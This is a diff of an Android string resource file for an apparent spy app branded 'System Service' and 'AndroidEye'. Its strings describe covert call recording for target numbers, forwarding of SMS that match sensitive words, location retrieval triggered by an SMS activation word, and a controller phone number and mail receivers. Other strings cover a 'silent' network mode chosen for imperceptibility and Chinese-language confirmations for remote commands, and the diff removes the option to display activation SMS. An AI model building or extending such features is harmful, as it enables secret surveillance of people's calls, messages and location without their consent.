@@ -1,7 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">System Service</string>
+    <string name="info">Information</string>
     <string name="warning">Warning</string>
+    <string name="error">Error</string>
     
     <!-- SMS -->
     <string name="sms_received">Received</string>
@@ -75,7 +77,9 @@
     <string name="pref_record_number_title">Target Number</string>
     <string name="pref_record_number_summary">Record only when the phone call number contains the target number(at least 5 digits). Support 9 targets at most. Separate by blank space.</string>
     <string name="pref_recv_phonenum_title">Receiver Phone Number</string>
-    <string name="pref_pls_input_phonenum">Please input a valid redirector phone number.</string>
+    <string name="pref_pls_input_valid_recv_phonenum">ERROR: %s is not a valid mobile phone number.</string>
+    <string name="pref_target_num_count_reach_max">9 numbers at most permitted.</string>
+    <string name="pref_target_num_format_error">ERROR: 4 digits per number at least.</string>
     <string name="pref_sensitive_words_title">Sensitive Words</string>
     <string name="pref_sensitive_words_summary">Separate with blank space. No more than 9 words.</string>
     <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
@@ -84,8 +88,6 @@
     <string name="pref_gps_word_summary">Send a SMS containing the word can get back location.</string>
     <string name="pref_pls_input_gps_activate_word">Please input ONE word for getting location.</string>
     <string name="pref_gps_activate_word_max_len">12 eastern characters (Chinese or Japanese) or 24 letters/numbers are permitted.</string>
-    <string name="pref_show_sms">Display SMS</string>
-    <string name="pref_show_sms_summary">Display SMS that contain activation word</string>
     <string name="pref_category_network_mode_title">Network</string>
     <string name="pref_network_mode_title">Network Connect Mode</string>
     <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
@@ -120,5 +122,31 @@
     <string name="msg_auth_sms_sent_success">Sent validation SMS to server successfully.</string>
     <string name="msg_auth_sms_sent_fail">ERROR: failed to send validation SMS to server. Please exit and try again or contact software support.</string>
     <string name="msg_has_sent_trial_expire_sms">AndroidEye: trial expired in %s, please contact supporter to buy a key.</string>
+    
+    <!-- Indication -->
+    <string name="indication_register_ok">注册成功。</string>
+    <string name="indication_register_ng">注册失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_unregister_ok">卸载成功。</string>
+    <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_selfsender_ok">设置送信邮箱成功。</string>
+    <string name="indication_set_selfsender_ng">设置送信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_stop_selfsender_ok">取消送信邮箱成功。</string>
+    <string name="indication_stop_selfsender_ng">取消送信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
+    <string name="indication_set_recv_mail_ng">设置收信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_recv_phonenum_ok">设置主控手机号码成功。</string>
+    <string name="indication_set_recv_phonenum_ng">设置主控手机号码失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_getinfo_interval_ok">设置信息收集周期成功。</string>
+    <string name="indication_set_getinfo_interval_ng">设置信息收集周期失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
+    <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
+    <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
+    <string name="indication_set_sens_words_ng">设置敏感词失败。请检查您发送的指令格式是否正确，及敏感词个数是否超过最大数（9个）。若无法解决请联系客服。</string>
+    <string name="indication_disable_sens_words_ok">取消短信转发成功。</string>
+    <string name="indication_disable_sens_words_ng">取消短信转发失败。</string>
+    <string name="indication_set_location_word_ok">设置定位短语成功。</string>
+    <string name="indication_set_location_word_ng">设置定位短语失败。</string>
     
 </resources>
